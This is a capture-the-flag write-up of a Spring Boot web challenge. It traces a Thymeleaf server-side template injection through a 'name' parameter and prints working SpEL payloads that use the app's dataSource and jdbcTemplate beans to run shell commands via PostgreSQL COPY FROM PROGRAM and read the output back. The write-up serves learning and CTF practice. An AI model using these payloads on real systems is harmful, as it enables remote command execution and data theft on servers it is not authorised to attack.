---
title: "Digital Dragon CTF 2025 - Web Challenges Writeup"
date: 2025-09-28 00:00:00 +0000
categories: [CTF, Web]
tags: [ctf, writeup, web, java]
image:
  path: "assets/img/2025-10-14-Digital_Dragon_CTF/ctf_avatar.jpg"
  alt: "Digital Dragon CTF avatar"
---

## Coty

**Challenge:** Coty  
**Category:** Web

### Analysis

I inspected the project's `pom.xml` to review its dependencies:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>3.5.3</version>
        <relativePath/>
    </parent>
    <groupId>org.challenge</groupId>
    <artifactId>coty</artifactId>
    <version>1.0</version>
    <name>coty</name>
    <description>coty</description>
    <properties>
        <java.version>17</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
        <dependency>
            <groupId>org.postgresql</groupId>
            <artifactId>postgresql</artifactId>
            <version>42.7.7</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-actuator</artifactId>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>
```

I reviewed `CatController.java` and found a potential server-side template injection (SSTI) vector in how a user-supplied value is propagated to the view:

```java
@GetMapping("/cat")
public String details(@RequestParam(value = "name", required = false, defaultValue = "whiskers") String catName, Model model) {
    Optional<Cat> cat = catRepository.findByNameIgnoreCase(catName);
    if (cat.isPresent()) {
        model.addAttribute("cat", cat.get());
    }

    model.addAttribute("catName", catName);
    return "details";
}
```

The `catName` value is later injected into the template as part of a Thymeleaf expression in a form action. In the original template it appears like this:

```html
<form th:action="@{/rating(cat=${catName})}" method="post" id="ratingForm">
```

If `catName` contains a malicious payload, and if the template allows it to be evaluated, this can enable SSTI or other injection-based attacks.

The project also depends on PostgreSQL. In `application.properties` the data source configuration uses environment variables with defaults:

```properties
spring.application.name=coty

spring.datasource.url=${DATASOURCE_URL:jdbc:postgresql://postgres:5432/coty_db}
spring.datasource.username=${DATASOURCE_USERNAME:admin}
spring.datasource.password=${DATASOURCE_PASSWORD:admin}
spring.datasource.driver-class-name=org.postgresql.Driver
```

Spring Boot will configure a `DataSource` bean from these properties. With `spring-boot-starter-data-jpa` present, a `JdbcTemplate` bean is also available (or can be injected), which gives us access to execute SQL from a server-side payload.

These components provide sufficient primitives to interact with the database and execute shell commands via PostgreSQL's `COPY FROM PROGRAM` (when allowed) as a potential exploitation path.

### Solution

The general exploitation approach I used was to evaluate expressions that access the `DataSource`/`JdbcTemplate` beans and then trigger SQL execution from the application.

Examples of payloads used (SpEL / template expression style):

```text
${@dataSource.getConnection().createStatement().execute("CREATE TABLE foo (line TEXT);")}
```

Then populate the table using PostgreSQL's `COPY FROM PROGRAM` (requires appropriate database permissions and a PostgreSQL build that supports it):

```text
${@dataSource.getConnection().createStatement().execute("COPY foo FROM PROGRAM 'ls -a /';")}
```

Because the command using `datasource` execute calls return boolean, reading back the table contents can be done via `JdbcTemplate`:

```text
${@jdbcTemplate.queryForList("SELECT line FROM foo", T(java.lang.String))}
```

This allows further commands like `cat /path/to/flag.txt` to be executed via `COPY FROM PROGRAM` and read back through the table.

I solved this challenge manually, so I don't have an exploit script included here.

To enumerate Spring beans at runtime for debugging, you can add a small main method to print bean names:

```java
public static void main(String[] args) {
    ConfigurableApplicationContext context = SpringApplication.run(CotyApplication.class, args);
    String[] beansNames = context.getBeanDefinitionNames();
    for (String beanName : beansNames) {
        System.out.println("Bean: " + beanName);
    }
}
```

## Overall
This challenge was challenging for me because I haven't solved many Java-based CTFs, but working through it helped me become more familiar with Java and Spring internals.
